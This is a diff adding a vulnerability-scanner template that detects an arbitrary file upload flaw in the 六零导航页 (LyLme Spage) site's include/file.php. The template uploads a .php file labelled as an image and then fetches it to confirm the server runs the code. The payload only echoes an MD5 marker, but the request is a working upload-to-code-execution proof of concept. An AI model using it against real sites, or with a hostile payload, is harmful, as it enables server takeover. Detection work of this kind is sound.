@@ -1,0 +1,59 @@
+id: poc-yaml-lylme-spage-file-php-anyfile-upload
+info:
+  name: Arbitrary File Upload Vulnerability in 六零导航页 file.php
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in 六零导航页 file.php. Attackers can exploit this to upload malicious PHP files and gain remote code execution.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/include/file.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------207262699182048909098055515"
+    body: |-
+      -----------------------------207262699182048909098055515
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/png
+
+      <?php echo md5({{t1}});?>
+      -----------------------------207262699182048909098055515--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "php"
+    extractors:
+      - type: regex
+        name: path
+        group: 1
+        regex:
+          - 'url":"\\/(?P<path>.*?).php'
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{path}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
